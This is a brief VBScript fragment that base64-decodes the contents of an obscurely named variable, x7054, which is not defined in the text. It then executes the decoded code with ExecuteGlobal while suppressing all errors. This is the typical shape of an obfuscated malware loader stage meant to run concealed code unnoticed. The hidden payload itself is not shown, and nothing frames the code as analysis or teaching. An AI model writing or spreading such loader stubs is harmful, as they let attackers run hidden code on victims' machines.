Function Base64Decode(s)
    On Error Resume Next
    Dim oXML, oNode, stream
    Err.Clear
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    If Err.Number <> 0 Then
        Err.Clear
        Set oXML = CreateObject("Msxml2.DOMDocument")
    End If
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = s
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write oNode.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = "utf-8"
    Base64Decode = stream.ReadText
    stream.Close
    If Err.Number <> 0 Then Base64Decode = ""
End Function

On Error Resume Next
Dim decoded
Err.Clear
decoded = Base64Decode(x7054)
If Err.Number = 0 And Len(decoded) > 0 Then
    Err.Clear
    ExecuteGlobal decoded
End If